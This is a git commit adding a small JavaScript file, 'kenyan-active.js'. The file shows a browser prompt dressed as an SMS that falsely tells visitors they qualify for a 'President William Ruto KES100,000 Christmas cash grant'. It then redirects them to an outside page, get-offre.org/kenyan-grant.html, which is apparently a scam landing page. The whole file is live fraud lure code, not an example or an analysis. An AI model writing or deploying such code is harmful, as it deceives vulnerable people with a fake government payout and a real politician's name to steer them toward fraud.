7dad45c0ee7f40a8e288e5c37cebbc730d0d024b
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-27 01:48:35 -0800

    Create kenyan-active.js

---
+++ kenyan-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW KES100,000'
+password=prompt('SMS: Congratulations You are qualify for President WILLIAM RUTO KES100,000 CHRISTMAS CASH GRANT FOR KENYANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW KES100,000');
+if (password != 'WITHDRAW KES100,000') {
+location.href='https://get-offre.org/kenyan-grant.html';
+}
